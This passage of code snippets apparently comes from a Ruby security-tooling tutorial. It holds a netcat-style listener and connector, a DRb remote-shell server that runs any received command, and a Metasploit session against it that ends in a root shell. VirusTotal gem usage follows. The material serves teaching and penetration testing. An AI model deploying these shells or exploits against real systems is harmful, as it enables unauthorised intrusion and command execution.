host\") do\n            @options.connection_type = :connect\n        end\n        opts.on('-l', '--listen',\n            \"Listen for a remote host to connect to this host\") do\n            @options.connection_type = :listen\n        end\n        opts.on('-r', '--remote-host HOSTNAME', String,\n            \"Specify the host to connect to\") do |hostname|\n            @options.hostname = hostname || '127.0.0.1'\n        end\n        opts.on('-p', '--port PORT', Integer,\n            \"Specify the TCP port\") do |port|\n            @options.port = port\n        end\n        opts.on('-v', '--verbose') do\n            @options.verbose = :verbose\n        end\n        opts.on_tail('-h', '--help', \"Show this message\") do\n            puts opts\n            exit\n        end\n    end\n\n    begin\n        opts.parse!(args)\n    rescue OptionParser::ParseError => err\n      puts err.message\n      puts opts\n      exit\n    end\n    if @options.connection_type == nil\n      puts \"[!] \".red + \"No Connection Type specified\"\n      puts opts\n      exit\n    end\n    if @options.port == nil\n      puts \"[!] \".red + \"No Port specified to #{@options.connection_type.to_s.capitalize}\"\n      puts opts\n      exit\n    end\n    if @options.connection_type == :connect && @options.hostname == nil\n      puts \"[!] \".red + \"Connection type connect requires a hostname\"\n      puts opts\n      exit\n    end\n  end\n\n  #\n  # Socket Management\n  #\n  def connect_socket\n    begin\n      if @options.connection_type == :connect\n        # Client\n        puts \"[+] \".green + \"Connecting to \" + \"#{@options.hostname}\".bold + \" on port \" + \"#{@options.port}\".bold if @options.verbose == :verbose\n        @socket = TCPSocket.open(@options.hostname, @options.port)\n      else\n        # Server\n        puts \"[+] \".green + \"Listing on port \" + \"#{@options.port}\".bold if @options.verbose == :verbose\n        server = TCPServer.new(@options.port)\n        server.listen(1)\n        @socket = server.accept\n        print \"-> \".cyan\n      end\n    rescue Exception => e\n      puts \"[!] \".red + \"Error [1]: \" + \"#{e}\"\n      exit\n    end\n\n  end\n\n  #\n  # Data Transfer Management\n  #\n  def forward_data\n    while true\n      if IO.select([],[],[@socket, STDIN],0)\n        socket.close\n      end\n\n      # Send command if done from receiving upto 2-billions bytes\n      begin\n        while (data = @socket.recv_nonblock(2000000000)) != \"\"\n          STDOUT.write(data)\n          print \"-> \".cyan\n        end\n        exit\n      rescue Errno::EAGAIN\n        # http://stackoverflow.com/questions/20604130/how-to-use-rubys-write-nonblock-read-nonblock-with-servers-clients\n      end\n\n      begin\n        while (data = STDIN.read_nonblock(2000000000)) != \"\"\n          @socket.write(data)\n        end\n        exit\n      rescue Errno::EAGAIN\n        # http://stackoverflow.com/questions/20604130/how-to-use-rubys-write-nonblock-read-nonblock-with-servers-clients\n      rescue EOFError\n        exit\n      end\n\n      # Get all remote system socket(STDIN, STDOUT, STDERR) To my STDIN\n      IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])\n    end\n\n  end\n\n  #\n  # Run Ncat\n  #\n  def run(args)\n    parse_opts(args)\n    connect_socket\n    forward_data\n  end\nend\nncat = NetCat.new\nncat.run(ARGV) \n```", "```\n    ruby ncat.rb -lvp 443 \n    ```", "```\n    ruby ncat.rb -cv -r RHOST -p 443 \n    ```", "```\n#!/usr/bin/env ruby\nrequire 'drb'\n\nclass RShell\n   def exec(cmd)\n     `#{cmd}`\n   end\nend\n\nDRb.start_service(\"druby://0.0.0.0:8080\", RShell.new)\nDRb.thread.join \n```", "```\n#!/usr/bin/env ruby\nrequire 'drb'\n\nclass RShell\n   def exec(cmd)\n     `#{cmd}`\n   end\nend\n\n# Access List\nacl = ACL.new(%w{deny all\n                allow localhost\n                allow 192.168.1.*})\nDRb.install_acl(acl)\nDRb.start_service(\"druby://0.0.0.0:8080\", RShell.new)\nDRb.thread.join \n```", "```\nrshell = DRbObject.new_with_uri(\"druby://192.168.0.13:8080\")\nputs rshell.exec \"id\" \n```", "```\nmsf > use exploit/linux/misc/drb_remote_codeexec \nmsf exploit(drb_remote_codeexec) > set URI druby://192.168.0.13:8080\nuri => druby://192.168.0.13:8080\nmsf exploit(drb_remote_codeexec) > exploit \n\n[*] Started reverse double handler\n[*] trying to exploit instance_eval\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo UAR3ld0Uqnc03yNy;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: \"UAR3ld0Uqnc03yNy\\r\\n\"\n[*] Matching...\n[*] B is input...\n[*] Command shell session 2 opened (192.168.0.18:4444 -> 192.168.0.13:57811) at 2015-12-24 01:11:30 +0300\n\npwd\n/root\nid\nuid=0(root) gid=0(root) groups=0(root) \n```", "```\n#!/usr/bin/env ruby\nrequire 'drb'\nDRb.start_service(\"druby://0.0.0.0:8080\", []).thread.join \n```", "```\n    gem install virustotal \n    ```", "```\nvirustotal --create-config \n```", "```\ncat ~/.virustotal\nvirustotal:\n  api-key:\n  timeout: 10 \n```", "```\n    virustotal -f <file_with_hashes_one_per_line> \n    ```", "```\n    virustotal -h FD287794107630FA3116800E617466A9 \n    ```", "```\n    virustotal -f <file_with_hashes_one_per_line> -x \n    ```", "```\n    virustotal -u </path/to/file> \n    ```", "```\n    virustotal -s \"http://www.google.com\" \n    ```", "```\n    gem install uirusu \n    ```"]